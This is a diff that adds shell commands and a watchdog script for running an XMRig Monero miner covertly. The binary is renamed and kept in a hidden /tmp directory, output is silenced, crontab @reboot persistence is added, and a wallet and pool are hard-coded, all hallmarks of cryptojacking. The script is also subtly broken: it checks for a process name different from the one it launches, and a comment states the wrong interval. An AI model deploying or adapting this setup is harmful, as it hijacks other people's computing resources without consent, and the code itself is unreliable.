@@ -15,6 +15,57 @@ xmrig --url eu.hashvault.pro:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8Q
 
 xmrig --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 --yield 
 nohup ./moktarr --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 > /dev/null 2>&1 &
+
 curl -L -o xmrig-6.25.0.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-jammy-x64.tar.gz
 
 curl -L -o xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz
+
+
+# STEP 1 file
+
+MINER_PATH="/tmp/.Test-unix/moktarr"
+CMD="$MINER_PATH --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1"
+
+LAST_REFRESH=$(date +%s)
+
+#echo "[$(date)] Starting Watchdog with 12h Auto-Refresh..."
+
+while true; do
+    CURRENT_TIME=$(date +%s)
+    ELAPSED=$((CURRENT_TIME - LAST_REFRESH))
+
+    if [ $ELAPSED -gt 43200 ]; then
+        #echo "[$(date)] 12h reached. Refreshing connection..."
+        pkill -x xmrig
+        LAST_REFRESH=$CURRENT_TIME
+        sleep 5
+    fi
+
+    if ! pgrep -x "xmrig" > /dev/null; then
+        #echo "[$(date)] Miner NOT found. Restarting..."
+        $CMD > /dev/null 2>&1 &
+    fi
+
+    # Wait 10 minutes before the next check
+    sleep 600
+done
+
+# STEP 2
+
+#Make it executable: chmod +x javx.sh
+
+#Add it to your User Crontab: Type crontab -e and add this single line at the bottom:  @reboot /bin/bash /tmp/.Test-unix/javx.sh
+
+#How to use it:
+
+#    Make it executable: chmod +x javx.sh
+
+ #   Run it in the background: To keep it running even after you close your terminal, use screen (pre-installed on Ubuntu):
+
+  #      Type screen to open a new session.
+
+   #     Run the script: ./javx.sh
+
+    #    Press Ctrl + A then D to detach.
+
+    #The script is now the boss: It will check the miner every 5 minutes. If XMRig dies, the script starts it back up.
